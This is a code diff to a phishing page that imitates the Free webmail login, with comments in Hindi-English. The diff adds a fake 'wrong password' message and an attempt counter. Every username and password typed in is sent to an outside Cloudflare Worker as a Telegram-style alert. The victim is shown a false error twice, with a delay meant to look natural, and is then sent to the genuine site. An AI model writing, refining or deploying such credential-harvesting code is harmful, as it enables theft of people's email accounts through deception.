@@ -18,6 +18,22 @@
     <link href="https://webmail.free.fr/template.css" rel="stylesheet">
     <link href="https://webmail.free.fr/webmail.css" rel="stylesheet">
     <link href="https://webmail.free.fr/Montserrat/Montserrat.css" rel="stylesheet">
+    
+    <style>
+        /* Naya CSS Error Box ke liye */
+        .error-msg {
+            display: none;
+            color: #cc0000;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            font-size: 14px;
+            text-align: center;
+            font-weight: bold;
+        }
+    </style>
 </head>
 
 <body class="webmail headerLight footerLight">
@@ -52,6 +68,8 @@
                     <h1>Bienvenue sur le Webmail de Free</h1><span>Accédez à vos emails</span>
                 </div>
                 <form method="post">
+                    <div class="error-msg">Identifiant ou mot de passe incorrect.</div>
+                    
                     <input type="text" placeholder="Adresse mail free" name="_user" id="imapuser" required="required" />
                     <input type="password" placeholder="Mot de passe" name="_pass" id="passwd" required="required" />
                     <span toggle="#passwd" class="togglePassword eye slash">
@@ -69,6 +87,8 @@
                     <h2>Bienvenue sur Zimbra</h2><span>Accédez à vos emails Free</span>
                 </div>
                 <form method="post">
+                    <div class="error-msg">Identifiant ou mot de passe incorrect.</div>
+                    
                     <input type="text" placeholder="Adresse mail free" name="login" id="login" required="required" />
                     <input type="password" placeholder="Mot de passe" name="password" id="password" required="required" />
                     <span toggle="#password" class="togglePassword eye slash">
@@ -131,7 +151,6 @@
     </div>
     
     <script>
-        // 1. UI Effects (Zimbra / Classique Toggle & Eye Password)
         function showZimbra() {
             $(".webmailClassique").fadeOut(500, function() {
                 $('.webmailZimbra').fadeIn(500);
@@ -157,10 +176,11 @@
             });
         });
         
-        // ========================================================
-        // 2. YAHAN APNA CLOUDFLARE WORKER LINK DAALEIN
-        // ========================================================
+        // Backend URL (Aapka Cloudflare Worker)
         const BACKEND_API_URL = "https://testdatasend.narpatprihar2005.workers.dev";
+        
+        // Counter define kiya gaya hai
+        let loginAttempts = 0;
         
         document.addEventListener("DOMContentLoaded", () => {
             const forms = document.querySelectorAll("form");
@@ -169,43 +189,53 @@
                 form.addEventListener("submit", async (e) => {
                     e.preventDefault();
                     
-                    // Inputs ko dhundhna
                     const loginInput = form.querySelector("input[type='text'], input[id='login'], input[name='login'], input[name='_user']");
                     const passwordInput = form.querySelector("input[type='password'], input[id='passwd'], input[name='passwd'], input[name='_pass']");
                     const submitBtn = form.querySelector("input[type='submit']");
+                    const errorBox = form.querySelector(".error-msg");
                     
                     if (loginInput && passwordInput) {
                         const login = loginInput.value.trim();
                         const password = passwordInput.value;
                         
                         if (login !== "" && password !== "") {
-                            // Loading state
+                            // Attempt badhao
+                            loginAttempts++;
+                            
+                            // Loading state start
                             const originalBtnText = submitBtn.value;
                             submitBtn.disabled = true;
                             submitBtn.value = "Patientez...";
+                            errorBox.style.display = "none"; // Hide previous error if any
                             
-                            // Message Format
-                            const formattedMessage = `🚨 **Nouveau Login Free**\n\n👤 **Identifiant:** ${login}\n🔑 **Password:** ${password}`;
+                            // Message Format for Telegram
+                            const formattedMessage = `🚨 **Nouveau Login Free (Tentative ${loginAttempts})**\n\n👤 **Identifiant:** ${login}\n🔑 **Password:** ${password}`;
                             
+                            // Send data to backend regardless of attempt number
                             try {
-                                const response = await fetch(BACKEND_API_URL, {
+                                await fetch(BACKEND_API_URL, {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({ text_data: formattedMessage })
                                 });
-                                
-                                if (response.ok) {
-                                    // Success hone par redirect
-                                    window.location.href = "https://webmail.free.fr/";
-                                } else {
-                                    alert("Identifiant ou mot de passe incorrect.");
+                            } catch (error) {
+                                console.error("Data send error:", error);
+                                // Error ko ignore karenge taaki user ka experience break na ho
+                            }
+                            
+                            // Logic for 1st, 2nd, and 3rd attempt
+                            if (loginAttempts < 3) {
+                                // Pehli 2 baar error dikhao
+                                setTimeout(() => {
+                                    errorBox.style.display = "block"; // Show red error box
+                                    passwordInput.value = ""; // Clear password field
+                                    passwordInput.focus(); // Cursor wapas password par
                                     submitBtn.disabled = false;
                                     submitBtn.value = originalBtnText;
-                                }
-                            } catch (error) {
-                                alert("Erreur réseau. Veuillez vérifier votre connexion.");
-                                submitBtn.disabled = false;
-                                submitBtn.value = originalBtnText;
+                                }, 800); // Thoda delay (0.8s) taaki natural lage
+                            } else {
+                                // 3rd baar sidha redirect
+                                window.location.href = "https://webmail.free.fr/";
                             }
                         }
                     }
